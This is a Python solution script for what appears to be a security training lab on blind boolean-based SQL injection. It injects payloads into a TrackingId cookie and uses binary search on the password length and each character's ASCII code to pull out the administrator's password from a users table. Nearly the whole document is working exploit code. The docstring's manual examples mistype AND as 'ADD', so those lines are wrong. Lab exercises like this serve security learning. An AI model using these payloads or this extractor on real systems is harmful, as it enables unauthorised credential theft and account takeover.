"""
This lab contains a blind SQL injection vulnerability. 
The application uses a tracking cookie for analytics, 
and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, 
and no error messages are displayed. 
But the application includes a "Welcome back" message in the page if the query returns any rows.
The database contains a different table called users, with columns called username and password. 
You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user. 

Vulnerable attributes = Tracking cookie

END GOAL

    1. ENUMULATE ADMINISTRATOR PASSWORD

    2. LOGIN AS ADMINISTRATOR


test injection possibility by using conditional queries

cm1O48qFb9AFJKwU' ADD '1'='1'--  >should show Welcome back message on the website
cm1O48qFb9AFJKwU' ADD '1'='2'--  >should show not Welcome back message on the website


# Confirm that  the user table exits
cm1O48qFb9AFJKwU' ADD (SELECT 'x' FROM users LIMIT 1)='x'--  >should show Welcome back message on the website

# Confirm a user with the administrator username

cm1O48qFb9AFJKwU' ADD (SELECT 'x' FROM users WHERE username='administrator')='x'--  >should show Welcome back message on the website

"""

import requests
from bs4 import BeautifulSoup
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor

POISON_STASH = dict(
    boolean_condition = "' AND '1'='1'--",
    user_table_confirm= "' AND(SELECT 'x' FROM users LIMIT 1)='x'--",
    confirm_admin_user="' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--",
    admin_password_limit="' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password){}{})='x'--",
    password_harvester="' AND (SELECT 'x' FROM users WHERE username='administrator' and ASCII(SUBSTRING(password,{},1)){}{})='x'--"
)

def poison_cookies(session:requests.Session, poison:str)->dict:

    cookies = session.cookies.get_dict().copy()

    cookies['TrackingId'] = "{}{}".format(
        cookies['TrackingId'],
        poison
    )

    return cookies

def inject_payload(session:requests.Session, poison:dict,url:str):

    try:

        resp = session.get(url=url, cookies=poison_cookies(session=session,poison=poison))

    except Exception as error:

        print(f"Error occured {error} exiting")

        sys.exit()

    soup = BeautifulSoup(resp.text, 'html.parser')

    return True if soup.find(string='Welcome back!') is not None else False

def query_password_length(session:requests.Session, url:str, length:int):

    if inject_payload(session=session,poison=POISON_STASH['admin_password_limit'].format("<", length), url=url):

        return 1

    if inject_payload(session=session,poison=POISON_STASH['admin_password_limit'].format(">", length), url=url):

        return -1

    return 0

def find_password_length(space:int, session:requests.Session, url:str)-> int:

    length, low, high = None, 0, space

    while low <= high:

        mid = sum((low,high))//2

        answ = query_password_length(session=session,url=url,length=mid)

        print(f'search space between {low} and {high}')

        if answ > 0:

            high = mid-1

        if answ < 0:

            low = mid+1
        
        if answ == 0:

            length = mid

            break

    return length

def password_char_query(session:requests.Session, url:str, position:int, ascii_code:int):

    if inject_payload(
        session=session,
        poison=POISON_STASH['password_harvester'].format(position, "<", ascii_code),
        url=url
    ):

        return 1

    if inject_payload(
        session=session,
        poison=POISON_STASH['password_harvester'].format(position, ">", ascii_code),
        url=url
    ):

        return -1

    return 0

def harvest_password(session:requests.Session, url, character_info):

    low, high, character = 36, 126, None

    while low <= high:

        mid = sum((low,high))//2

        answ = password_char_query(
            session=session,
            url=url,
            position=character_info['position'],
            ascii_code=mid
        )

        if answ > 0:

            high = mid-1

        if answ < 0:

            low = mid+1

        if answ == 0:

            character = chr(mid)

            print(f"Got {character} for pos: {character_info['position']}")

            break

    return character

def main(url:str, space:int)->None:

    print("(+) Starting the session")

    session = requests.Session()

    # get the cookies
    session.get(url=url)

    # assert injection

    assert inject_payload(
        session=session,
        poison=POISON_STASH['boolean_condition'],
        url=url
    )

    # assert user table exists

    assert inject_payload(
        session=session,
        poison=POISON_STASH['user_table_confirm'],
        url=url
    )

    # assert admin user exists

    assert inject_payload(
        session=session,
        poison=POISON_STASH['confirm_admin_user'],
        url=url
    )

    # find password length

    length = find_password_length(
        space=int(space),
        session=session,
        url=url
    )

    unknowns = [{'confirmed':None, 'position':n+1} for n in range(length)]

    with ThreadPoolExecutor(max_workers=4) as executors:

        for unknown in unknowns:

            executors.submit(harvest_password, session, url, unknown)

if __name__ == "__main__":

    parser = argparse.ArgumentParser()

    parser.add_argument('url', help='Your endpoint url')

    parser.add_argument('space', help='password length search space')

    args = parser.parse_args()

    main(url=args.url, space=args.space)
